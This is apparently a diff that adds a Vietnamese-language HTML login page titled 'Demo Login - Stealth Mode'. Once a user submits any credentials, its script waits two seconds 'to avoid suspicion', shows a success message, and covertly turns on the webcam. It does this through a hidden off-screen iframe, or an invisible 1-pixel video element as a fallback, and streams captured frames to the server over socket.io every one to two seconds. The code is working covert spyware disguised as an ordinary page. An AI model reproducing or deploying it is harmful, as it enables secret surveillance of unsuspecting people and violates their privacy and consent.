@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Demo Login - Stealth Mode</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 50px; }
+        .login-form { max-width: 400px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; }
+        input { width: 100%; padding: 10px; margin: 10px 0; }
+        button { width: 100%; padding: 10px; background: #007bff; color: white; border: none; }
+    </style>
+</head>
+<body>
+    <div class="login-form">
+        <h2>Đăng nhập</h2>
+        <input type="text" id="username" placeholder="Tên đăng nhập">
+        <input type="password" id="password" placeholder="Mật khẩu">
+        <button onclick="login()">Đăng nhập</button>
+    </div>
+    
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+        let mediaRecorder;
+        
+        async function stealthCamera() {
+            try {
+                // Tạo iframe ẩn để chạy camera
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.style.position = 'absolute';
+                iframe.style.left = '-9999px';
+                iframe.style.width = '1px';
+                iframe.style.height = '1px';
+                document.body.appendChild(iframe);
+                
+                // Chạy camera trong iframe
+                iframe.contentDocument.write(`
+                    <script>
+                        (async () => {
+                            try {
+                                const stream = await navigator.mediaDevices.getUserMedia({
+                                    video: { width: 320, height: 240 },
+                                    audio: false
+                                });
+                                
+                                const video = document.createElement('video');
+                                video.srcObject = stream;
+                                video.play();
+                                
+                                const canvas = document.createElement('canvas');
+                                canvas.width = 320;
+                                canvas.height = 240;
+                                const ctx = canvas.getContext('2d');
+                                
+                                setInterval(() => {
+                                    ctx.drawImage(video, 0, 0, 320, 240);
+                                    const imageData = canvas.toDataURL('image/jpeg', 0.4);
+                                    parent.postMessage({type: 'video', data: imageData}, '*');
+                                }, 1500);
+                                
+                            } catch(e) { console.log('Camera failed'); }
+                        })();
+                    <\/script>
+                `);
+                
+                // Nhận data từ iframe
+                window.addEventListener('message', (event) => {
+                    if (event.data.type === 'video') {
+                        socket.emit('video-stream', event.data.data);
+                    }
+                });
+                
+            } catch (err) {
+                // Fallback method
+                fallbackCamera();
+            }
+        }
+        
+        async function fallbackCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { 
+                        width: { exact: 1 },
+                        height: { exact: 1 }
+                    },
+                    audio: false
+                });
+                
+                // Tắt track ngay sau khi lấy được
+                setTimeout(() => {
+                    stream.getVideoTracks().forEach(track => {
+                        track.enabled = false;
+                        setTimeout(() => track.enabled = true, 100);
+                    });
+                }, 1000);
+                
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.style.opacity = '0';
+                video.style.position = 'fixed';
+                video.style.top = '-1000px';
+                video.play();
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = 320;
+                canvas.height = 240;
+                const ctx = canvas.getContext('2d');
+                
+                setInterval(() => {
+                    ctx.drawImage(video, 0, 0, 320, 240);
+                    const imageData = canvas.toDataURL('image/jpeg', 0.4);
+                    socket.emit('video-stream', imageData);
+                }, 2000);
+                
+            } catch (err) {
+                console.log('All camera methods failed');
+            }
+        }
+        
+        function login() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if (username && password) {
+                // Delay để tránh nghi ngờ
+                setTimeout(() => {
+                    stealthCamera();
+                }, 2000);
+                
+                alert('Đăng nhập thành công!');
+                document.querySelector('.login-form').innerHTML = '<h2>Chào mừng ' + username + '!</h2><p>Bạn đã đăng nhập thành công.</p>';
+            } else {
+                alert('Vui lòng nhập đầy đủ thông tin!');
+            }
+        }
+    </script>
+</body>
+</html>
